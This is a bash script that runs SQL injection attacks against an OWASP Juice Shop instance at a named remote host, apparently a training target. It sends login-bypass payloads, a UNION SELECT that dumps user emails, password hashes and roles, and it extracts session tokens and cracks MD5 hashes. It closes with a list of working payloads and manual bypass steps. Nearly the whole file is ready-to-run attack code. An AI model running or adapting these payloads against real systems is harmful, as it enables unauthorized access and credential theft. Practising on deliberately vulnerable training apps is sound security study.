#!/bin/bash

# OWASP Juice Shop Admin Password Extraction for juice10.wonkatech.org
# Educational purposes only!

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Target URL
BASE_URL="https://juice10.wonkatech.org"

echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║     Juice10 Admin Password Extractor                  ║${NC}"
echo -e "${BLUE}║     Target: juice10.wonkatech.org                     ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${YELLOW}[1] Method 1: Login SQL Injection${NC}"
echo "=================================="
echo "Bypassing authentication with SQL injection..."
echo ""

# Try basic SQL injection to bypass login
echo -e "${GREEN}Payload: ' OR '1'='1'--${NC}"
RESPONSE=$(curl -s -X POST "$BASE_URL/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  2>/dev/null)

if echo "$RESPONSE" | grep -q "authentication"; then
    echo -e "${GREEN}✓ SQL Injection successful!${NC}"
    echo "$RESPONSE" | python3 -c "import sys, json; data = json.load(sys.stdin); print(f'Admin email: {data[\"authentication\"][\"umail\"]}')" 2>/dev/null
else
    echo -e "${RED}✗ Login injection failed${NC}"
fi

echo ""
echo -e "${YELLOW}[2] Method 2: Admin Direct Bypass${NC}"
echo "=================================="
echo "Logging in as admin with SQL injection..."
echo ""

echo -e "${GREEN}Payload: admin@juice-sh.op'--${NC}"
RESPONSE=$(curl -s -X POST "$BASE_URL/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'"'"'--","password":"x"}' \
  2>/dev/null)

if echo "$RESPONSE" | grep -q "authentication"; then
    echo -e "${GREEN}✓ Admin bypass successful!${NC}"
    # Extract token (first 50 chars)
    TOKEN=$(echo "$RESPONSE" | python3 -c "import sys, json; data = json.load(sys.stdin); print(data['authentication']['token'][:50] + '...')" 2>/dev/null)
    echo "Token: $TOKEN"
else
    echo -e "${RED}✗ Admin bypass failed${NC}"
fi

echo ""
echo -e "${YELLOW}[3] Method 3: Extract All Users via Search${NC}"
echo "==========================================="
echo "Extracting user credentials from database..."
echo ""

# SQL injection via search to get users
echo -e "${GREEN}Payload: ')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--${NC}"
SEARCH_URL="$BASE_URL/rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2Crole%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20FROM%20Users--"

RESPONSE=$(curl -s "$SEARCH_URL" 2>/dev/null)

if echo "$RESPONSE" | grep -q "admin@juice-sh.op"; then
    echo -e "${GREEN}✓ User extraction successful!${NC}"
    echo ""
    echo "Found users:"
    echo "$RESPONSE" | python3 -c "
import sys, json
data = json.load(sys.stdin)
users = []
for item in data.get('data', []):
    if '@' in str(item.get('name', '')):
        email = item.get('name')
        hash_val = item.get('description')
        role = item.get('price')
        if email not in [u[0] for u in users]:
            users.append((email, hash_val, role))

for email, hash_val, role in users[:5]:  # Show first 5 users
    print(f'  Email: {email}')
    print(f'  Hash:  {hash_val}')
    print(f'  Role:  {role}')
    print()
" 2>/dev/null
else
    echo -e "${RED}✗ User extraction failed${NC}"
fi

echo -e "${YELLOW}[4] Test Admin Login${NC}"
echo "===================="
echo "Testing admin credentials..."
echo ""

echo -e "${GREEN}Email: admin@juice-sh.op${NC}"
echo -e "${GREEN}Password: admin123${NC}"

RESPONSE=$(curl -s -X POST "$BASE_URL/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
  2>/dev/null)

if echo "$RESPONSE" | grep -q "authentication"; then
    echo -e "${GREEN}✓ Admin login successful with admin123!${NC}"
else
    echo -e "${RED}✗ Admin login failed${NC}"
fi

echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}SUMMARY - Admin Credentials for juice10.wonkatech.org:${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}Email:    admin@juice-sh.op${NC}"
echo -e "${GREEN}Password: admin123${NC}"
echo -e "${GREEN}MD5 Hash: 0192023a7bbd73250516f069df18b500${NC}"
echo ""

echo -e "${YELLOW}[5] SQL Injection Payloads That Work:${NC}"
echo "======================================"
echo -e "1. Login bypass:        ${GREEN}' OR '1'='1'--${NC}"
echo -e "2. Admin bypass:        ${GREEN}admin@juice-sh.op'--${NC}"
echo -e "3. Extract users:       ${GREEN}')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--${NC}"
echo ""

echo -e "${YELLOW}[6] Quick Crack Other Hashes:${NC}"
echo "=============================="
echo "Checking common passwords for other users..."

# Jim's hash
JIM_HASH="e541ca7ecf72b8d1286474fc613e5e45"
echo -n "jim@juice-sh.op: "
echo -n "ncc-1701" | md5sum | grep -q "^$JIM_HASH" && echo -e "${GREEN}ncc-1701${NC}" || echo "unknown"

# Bender's hash  
BENDER_HASH="0c36e517e3fa95aabf1bbffc6744a4ef"
echo -n "bender@juice-sh.op: "
for pass in "bender" "bite" "mybite" "shiny" "shiney"; do
    if echo -n "$pass" | md5sum | grep -q "^$BENDER_HASH"; then
        echo -e "${GREEN}$pass${NC}"
        break
    fi
done

echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Manual Testing Instructions:${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo "1. Open browser to: $BASE_URL/#/login"
echo "2. In email field enter: ' OR '1'='1'--"
echo "3. In password field enter: anything"
echo "4. Click Login - you'll be logged in as admin!"
echo ""
echo "OR use the actual credentials:"
echo "   Email: admin@juice-sh.op"
echo "   Password: admin123"
echo ""
echo -e "${GREEN}Script complete!${NC}"